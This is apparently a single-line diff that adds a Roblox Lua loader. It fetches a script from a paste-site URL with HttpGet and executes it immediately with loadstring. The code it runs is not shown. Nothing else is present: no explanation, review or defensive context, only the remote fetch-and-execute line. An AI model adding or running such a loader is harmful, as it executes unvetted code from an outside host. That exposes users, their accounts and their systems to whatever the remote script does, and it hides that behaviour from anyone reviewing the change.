@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://snippet.host/cpyodh/raw"))()
